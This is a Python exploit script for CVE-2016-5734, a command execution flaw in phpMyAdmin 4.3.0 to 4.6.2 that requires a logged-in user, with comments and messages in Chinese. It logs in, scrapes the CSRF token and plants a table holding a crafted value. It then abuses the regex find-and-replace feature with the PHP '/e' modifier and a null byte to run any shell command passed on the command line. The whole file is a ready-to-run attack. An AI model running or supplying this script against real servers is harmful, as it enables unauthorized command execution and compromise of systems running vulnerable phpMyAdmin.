import requests
import argparse
import sys

"""
cve-2016-5734:PhpMyAdmin 4.3.0 - 4.6.2 authorized user RCE exploit
"""

def Create_dbAndCreate_table(req,url,db,token):
    data={
        "token":token,
        "reload":1,
        "new_db":db,
        "ajax_request":True
    }
    #创建数据库
    resp=req.post(url+"/db_create.php",data,cookies=requests.utils.dict_from_cookiejar(req.cookies))
    try:
        if resp.status_code == 200:
            print("数据库："+resp.json()["message"][92:])
    except:
        print("数据库:"+db+"已存在")

    sql='''CREATE TABLE `{0}` (
      `first` varchar(10) CHARACTER SET utf8 NOT NULL
    ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
    INSERT INTO `{0}` (`first`) VALUES (UNHEX('302F6500'));
    '''.format("prgpwn")

    data2={
            "is_js_confirmed": "0",
            "db": db,
            "token": token,
            "pos": "0",
            "sql_query": sql,
            "sql_delimiter": ";",
            "show_query": "0",
            "fk_checks": "0",
            "SQL": "Go",
            "ajax_request": "true",
            "ajax_page_request": "true",
        }
    #创建表,导入sql脚本
    resp2 = req.post(url + "/import.php", data2, cookies=requests.utils.dict_from_cookiejar(req.cookies))
    if resp2.status_code == 200:
        try:
            if resp.json()["error"].find("exists"):
                print("表已添加")
        except:
            print("完成表添加")
    print("完成数据库以及表添加")

def Exploit(req,url,db,token,cmd):
    exp={
        "db": db,
        "table": "prgpwn",
        "token": token,
        "goto": "sql.php",
        "find": "0/e\0",
        "replaceWith": cmd,
        "columnIndex": "0",
        "useRegex": "on",
        "submit": "Go",
        "ajax_request": "true"
    }

    resp=req.post(url+"/tbl_find_replace.php",exp,cookies=requests.utils.dict_from_cookiejar(req.cookies))
    if resp.status_code == 200:
        result=resp.json()["message"][resp.json()["message"].find("/a")+3:]
        print("命令："+cmd+" 命令执行结果："+result)
    else:
        print("攻击失败")

if __name__=='__main__':
    parse=argparse.ArgumentParser()
    parse.add_argument("url",type=str,help="URL with path")
    parse.add_argument("-c","--cmd",type=str,required=True)
    parse.add_argument("-u","--user",type=str,required=True)
    parse.add_argument("-p","--pwd",type=str,required=True)
    parse.add_argument("-d","--dbs",type=str,required=True)

    #接收参数
    args=parse.parse_args()
    url=args.url
    uname=args.user
    upass=args.pwd
    db=args.dbs
    cmd=args.cmd
    #提交参数
    req=requests.Session()
    req.proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}
    resp=req.post(url+"/?lang=en",dict(pma_username=uname,pma_password=upass))
    #获取登录后的token
    if resp.status_code is 200:
        token_place=resp.text.find("token=")+6
        token=resp.text[token_place:token_place+32]
    if token is False:
        print("不能发现有效的验证token")
        sys.exit(1)
    #创建数据库和表
    Create_dbAndCreate_table(req,url,db,token)
    #执行攻击
    Exploit(req,url,db,token,cmd)









